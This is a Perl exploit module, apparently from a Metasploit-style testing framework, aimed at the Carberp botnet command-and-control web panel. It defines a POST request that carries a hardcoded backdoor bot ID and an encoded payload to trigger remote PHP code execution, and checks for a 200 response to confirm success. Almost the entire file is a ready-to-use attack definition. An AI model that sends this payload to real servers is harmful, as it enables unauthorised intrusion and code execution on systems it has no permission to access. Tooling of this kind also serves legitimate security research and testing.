package CARBERP::MSF::CarberpBackdoorExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "CarberpBackdoorExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module exploits backdoors that can be found all over the leaked

        source code of the Carberp botnet C2 Web Panel.

      ",
  MSF_MODULE  => "carberp_backdoor_exec",
  REFERENCES  => [
                   "http://www.xylibox.com/2013/06/carberp-remote-code-execution-carpwned.html",
                 ],
  TITLE       => "Carberp Web Panel C2 Backdoor Remote PHP Code Execution",
  VARIABLES => {
    'BOTID' =>       {
  DESCRIPTION => "Hardcoded backdoor bot ID that can run PHP eval",
  VALUE => "BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT3 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => 'id=BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV&data=WyI1ZjVmNTA0MTU5NGM0ZjQxNDQ1ZjVmIl0%3d',
      TEXT   => 'Sending Exploit #3 Request : [POST] /',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
